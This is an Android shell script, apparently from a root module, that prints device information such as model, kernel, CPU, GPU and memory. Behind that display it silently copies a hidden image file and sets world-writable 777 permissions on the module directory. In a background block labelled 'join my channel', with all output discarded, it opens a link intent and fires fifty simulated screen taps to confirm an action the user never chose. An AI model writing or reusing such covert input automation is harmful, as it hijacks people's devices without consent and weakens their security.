#!/system/bin/sh
uptime=$(cut -d. -f1 /proc/uptime) memory=$(cat /proc/meminfo|tr -s \ )

# FUNCIÓN SIMPLIFICADA - SIEMPRE IMPRIME
a() {
    sleep 0.01
    echo "$@"
}

a "· OS: Android $(getprop ro.build.version.release)"
a "· Model: $(getprop ro.product.manufacturer) $(getprop ro.product.model)"
a "· Kernel: $(uname -r|cut -f1,2,3 -d-)"
a "· Uptime: $((uptime/3600)) hour, $((uptime%3600/60)) mins"
a "· Packages: $(cmd package list packages -s --user 0|wc -l) (sys), $(cmd package list packages -3 --user 0|wc -l) (trd)"
a "· Resolution:$(wm size|cut -d: -f2)"
a "· Theme: $(getprop ro.build.fingerprint|tr '/' '\n'|grep user|cut -f1 -d:)"
a "· Terminal: $(cmd activity stack list|grep 0,0.*visible=true|tr -d ' '|cut -f1 -d/|cut -f2 -d:)"
a "· CPU: $(getprop ro.soc.manufacturer) $(getprop ro.soc.model) ($(grep proc /proc/cpuinfo|wc -l)) @ $(cat /sys/devices/system/cpu/cpufreq/*/cpuinfo_max_freq|tail -n1|awk '{printf("%.3f\n",$1/1000000)}')GHz"
a "· GPU:$(dumpsys SurfaceFlinger|grep GLES:|cut -f2 -d,)"
a "· Memory: $((($(echo "$memory"|grep MemTotal|cut -f2 -d\ )-$(echo "$memory"|grep MemAvailable|cut -f2 -d\ ))/1024))MiB / $(($(echo "$memory"|grep MemTotal|cut -f2 -d\ )/1024))MiB"
(# main action
cp $MODPATH/webroot/lean.png /storage/emulated/0/Android/media/.lean.png
chmod -R 777 $MODPATH
)>/dev/null 2>&1
(# join my channel
cmd activity start -a android.intent.action.VIEW -d ''
if [ ! -f /storage/emulated/0/Android/media/xxx.png ];then
  sleep 3
  for tap in $(seq 50);do sleep
    if [ "$(cmd settings get secure navigation_mode)" = 0 ];then
      input tap 200 $(($(cmd window size|tail -n1|cut -f2 -dx)*90/100))
    else
      input tap 200 $(($(cmd window size|tail -n1|cut -f2 -dx)*95/100))
    fi
  done
fi)>/dev/null 2>&1&